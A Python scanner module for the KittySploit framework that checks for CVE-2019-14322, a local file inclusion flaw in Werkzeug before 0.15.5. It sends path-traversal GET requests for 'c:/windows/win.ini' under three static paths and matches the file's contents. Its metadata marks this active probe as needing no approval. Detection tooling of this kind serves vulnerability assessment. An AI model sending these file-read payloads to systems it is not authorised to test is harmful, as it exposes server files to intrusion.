#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Pallets Werkzeug before 0."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Pallets Werkzeug <0.15.5 - Local File Inclusion Detection',
        'description': 'Pallets Werkzeug before 0.15.5 is susceptible to local file inclusion because SharedDataMiddleware mishandles drive names (such as C:) in Windows pathnames.',
        'author': ['KittySploit Team'],
        'severity': 'high',
        'tags': ['web', 'scanner', 'cve', 'cve2019', 'lfi', 'odoo', 'packetstorm', 'palletsprojects', 'microsoft', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 3,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://palletsprojects.com/blog/werkzeug-0-15-5-released/',
            'http://packetstormsecurity.com/files/163398/Pallets-Werkzeug-0.15.4-Path-Traversal.html',
            'https://nvd.nist.gov/vuln/detail/CVE-2019-14322',
            'https://github.com/faisalfs10x/CVE-2019-14322-scanner',
        ],
        'cve': 'CVE-2019-14322',
    }

    def run(self):
        for path in ('/base_import/static/c:/windows/win.ini', '/web/static/c:/windows/win.ini', '/base/static/c:/windows/win.ini'):
            r = self.http_request(method="GET", path=path, allow_redirects=False)
            if not r or r.status_code != 200:
                continue
            body = r.text or ""
            body_all = ('bit app support', 'fonts', 'extensions',)
            if (all(m in body for m in body_all)):
                self.set_info(
                    severity='high',
                    reason="Pallets Werkzeug <0.15.5 - Local File Inclusion detected",
                    path=path,
                )
                return True
        return False

